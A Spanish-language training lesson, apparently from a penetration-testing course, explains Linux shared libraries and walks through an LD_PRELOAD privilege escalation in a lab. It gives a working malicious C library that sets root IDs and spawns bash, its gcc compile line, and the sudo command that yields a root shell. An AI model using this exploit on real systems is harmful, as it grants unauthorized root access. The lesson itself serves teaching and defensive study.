Es común que los programas de Linux utilicen bibliotecas de objetos compartidos vinculados dinámicamente (dynamically linked shared object libraries). Las bibliotecas contienen código compilado u otros datos que los desarrolladores utilizan para evitar tener que reescribir las mismas piezas de código en múltiples programas. Existen dos tipos de bibliotecas en Linux: `static libraries` (denotadas por la extensión de archivo .a) y `dynamically linked shared object libraries` (denotadas por la extensión de archivo .so). Cuando se compila un programa, las static libraries se convierten en parte del programa y no pueden ser alteradas. Sin embargo, las bibliotecas dinámicas (dynamic libraries) pueden ser modificadas para controlar la ejecución del programa que las llama.

Existen múltiples métodos para especificar la ubicación de las bibliotecas dinámicas (dynamic libraries), para que el sistema sepa dónde buscarlas durante la ejecución del programa. Esto incluye las flags `-rpath` o `-rpath-link` al compilar un programa, el uso de las variables ambientales `LD_RUN_PATH` o `LD_LIBRARY_PATH`, colocar las bibliotecas en los directorios predeterminados `/lib` o `/usr/lib`, o especificar otro directorio que contenga las bibliotecas dentro del archivo de configuración `/etc/ld.so.conf`.

Además, la variable de entorno `LD_PRELOAD` puede cargar una biblioteca antes de ejecutar un binario. Las funciones de esta biblioteca tienen preferencia sobre las predeterminadas. Los objetos compartidos requeridos por un binario se pueden ver utilizando la utilidad `ldd`.

```r
htb_student@NIX02:~$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

La imagen anterior enumera todas las bibliotecas requeridas por `/bin/ls`, junto con sus rutas absolutas.

---

## LD_PRELOAD Privilege Escalation

Vamos a ver un ejemplo de cómo podemos utilizar la variable de entorno [LD_PRELOAD](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) para escalar privilegios. Para esto, necesitamos un usuario con privilegios `sudo`.

```r
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

Este usuario tiene derechos para reiniciar el servicio Apache como root, pero como esto `NO` es un [GTFOBin](https://gtfobins.github.io/#apache) y la entrada en `/etc/sudoers` está escrita especificando la ruta absoluta, esto no podría usarse para escalar privilegios en circunstancias normales. Sin embargo, podemos explotar el problema de `LD_PRELOAD` para ejecutar un archivo de biblioteca compartida personalizado. Vamos a compilar la siguiente biblioteca:

```r
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Podemos compilar esto de la siguiente manera:

```r
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Finalmente, podemos escalar privilegios utilizando el comando a continuación. Asegúrate de especificar la ruta completa a tu archivo de biblioteca maliciosa.

```r
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```